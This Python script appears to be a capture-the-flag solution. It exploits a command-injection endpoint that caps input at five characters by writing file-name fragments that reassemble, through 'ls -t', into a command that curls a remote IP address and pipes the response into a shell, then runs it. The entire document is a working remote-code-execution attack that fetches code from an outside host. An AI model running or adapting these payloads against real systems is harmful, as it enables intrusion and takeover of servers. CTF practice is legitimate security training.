import requests
from time import sleep
from urllib.parse import quote
if __name__ == '__main__':
    payload = [
        # generate `ls -t>g` file
        '>ls\\',
        'ls>_',
        '>\ \\',
        '>-t\\',
        '>\>g',
        'ls>>_',

        # generate `curl 104.238.161.158|python`
        '>sh',
        '>ba\\',
        '>\|\\',
        '>8\\',
        '>15\\',
        '>1.\\',
        '>16\\',
        '>8.\\',
        '>23\\',
        '>4.\\',
        '>10\\',
        '>\ \\',
        '>rl\\',
        '>cu\\',

        # exec
        'sh _',
        'sh g',
    ]
    r = requests.get('http://d6cbaf15-b300-4872-8958-f635ec7efb8a.node3.buuoj.cn//?reset=1')

    for i in payload:
        assert len(i) <= 5
        r = requests.get('http://d6cbaf15-b300-4872-8958-f635ec7efb8a.node3.buuoj.cn//?cmd=' + quote(i) )
        print(i)
        sleep(0.2)